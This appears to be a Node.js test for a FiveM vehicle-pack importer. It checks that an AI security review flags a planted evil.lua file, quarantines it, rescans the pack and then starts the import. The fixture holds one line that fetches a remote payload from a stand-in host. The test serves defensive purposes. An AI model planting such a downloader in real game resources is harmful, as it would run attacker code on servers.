import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, mkdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import { promisify } from "node:util";
import { deflateRawSync } from "node:zlib";

const run = promisify(execFile);
const vehiclesDir = await mkdtemp(path.join(tmpdir(), "fbrp-security-repair-"));
process.env.FBRP_VEHICLES_DIR = vehiclesDir;
process.env.OPENAI_API_KEY = "test-key";
process.env.FBRP_FIVEM_ORIGIN = "http://fivem.test/fbrp_core";
const { createPersonalImporter } = await import("../src/personal-import.js");

const rsc = () => {
  const header = Buffer.alloc(16);
  header.write("RSC7");
  header.writeUInt32LE(162, 4);
  header.writeUInt32LE(0xa8000000, 8);
  header.writeUInt32LE(0x20000000, 12);
  return Buffer.concat([header, deflateRawSync(Buffer.alloc(512, 1))]);
};

test("a failed upload security check is repaired by AI, rescanned, and started live", async () => {
  const source = await mkdtemp(path.join(tmpdir(), "fbrp-security-pack-"));
  await mkdir(path.join(source, "data"));
  await mkdir(path.join(source, "stream"));
  await writeFile(path.join(source, "data", "vehicles.meta"), "<CVehicleModelInfo__InitDataList><Item><modelName>repaircar</modelName><txdName>repaircar</txdName><handlingId>repaircar</handlingId><gameName>repaircar</gameName></Item></CVehicleModelInfo__InitDataList>");
  await writeFile(path.join(source, "data", "handling.meta"), "<CHandlingDataMgr><HandlingData><Item><handlingName>repaircar</handlingName><fMass value=\"1500.0\" /></Item></HandlingData></CHandlingDataMgr>");
  await writeFile(path.join(source, "stream", "repaircar.yft"), rsc());
  await writeFile(path.join(source, "stream", "repaircar.ytd"), rsc());
  await writeFile(path.join(source, "evil.lua"), "PerformHttpRequest('https://example.invalid/payload')");
  const zip = path.join(source, "pack.zip");
  await run("python3", ["-c", "import sys,zipfile,pathlib\nroot=pathlib.Path(sys.argv[1])\nwith zipfile.ZipFile(sys.argv[2],'w') as z:\n [z.write(p,p.relative_to(root)) for p in root.rglob('*') if p.is_file() and p.name!='pack.zip']", source, zip]);

  const securityInputs = [];
  const realFetch = globalThis.fetch;
  globalThis.fetch = async (url, options) => {
    if (!String(url).startsWith("https://api.openai.com"))
      return new Response(JSON.stringify({ ok: true, state: "started" }), { status: 200, headers: { "Content-Type": "application/json" } });
    const body = JSON.parse(options.body);
    const input = JSON.parse(body.input);
    if (body.text.format.name === "vehicle_security_review") {
      securityInputs.push(input);
      const unsafe = securityInputs.length === 1;
      const answer = unsafe
        ? { verdict: "unsafe", summary: "Runtime downloader found.", findings: [{ severity: "critical", file: "evil.lua", reason: "Downloads remote code." }], repairs: [] }
        : { verdict: "safe", summary: "Only data-only vehicle files remain.", findings: [], repairs: [] };
      return new Response(JSON.stringify({ output: [{ content: [{ type: "output_text", text: JSON.stringify(answer) }] }] }), { status: 200 });
    }
    if (body.text.format.name === "vehicle_security_remediation") {
      assert.deepEqual(input.candidateFiles.map((file) => file.path), ["evil.lua"]);
      const answer = { summary: "Quarantined the runtime downloader.", actions: [{ file: "evil.lua", action: "quarantine", reason: "Runtime scripts are not needed by a data-only vehicle." }] };
      return new Response(JSON.stringify({ output: [{ content: [{ type: "output_text", text: JSON.stringify(answer) }] }] }), { status: 200 });
    }
    const answer = { label: "Repair Car", summary: "Installed.", notes: [], edits: [], liveries: [], vehicleType: "civilian", vehicleTypeReason: "No emergency-service evidence." };
    return new Response(JSON.stringify({ output: [{ content: [{ type: "output_text", text: JSON.stringify(answer) }] }] }), { status: 200 });
  };

  try {
    const audits = [];
    const importer = createPersonalImporter({
      personals: { assertManager: async () => {}, modelOf: (value) => String(value).toLowerCase() },
      audit: async (...args) => { audits.push(args); },
      db: {},
    });
    const bytes = await readFile(zip);
    const staged = await importer.uploadChunk("manager", new URLSearchParams({ offset: "0", total: String(bytes.length), name: "pack.zip" }), (async function* () { yield bytes; })());
    const result = await importer.convert("manager", { uploadId: staged.id, uploadName: "pack.zip" });

    assert.equal(securityInputs.length, 2);
    assert.ok(securityInputs[0].files.some((file) => file.path === "evil.lua"));
    assert.ok(!securityInputs[1].files.some((file) => file.path === "evil.lua"));
    assert.equal(result.started, true);
    assert.equal(result.security.verdict, "safe");
    assert.equal(result.security.remediation.actions[0].file, "evil.lua");
    assert.ok(result.notes.some((note) => /AI security repair quarantined evil\.lua/.test(note)));
    assert.ok(audits.some(([, action]) => action === "personal.import.security_remediated"));
    const marker = JSON.parse(await readFile(path.join(vehiclesDir, "fbrp_pv_repaircar", ".fbrp-import.json"), "utf8"));
    assert.equal(marker.security.remediation.actions[0].file, "evil.lua");
  } finally {
    globalThis.fetch = realFetch;
  }
});
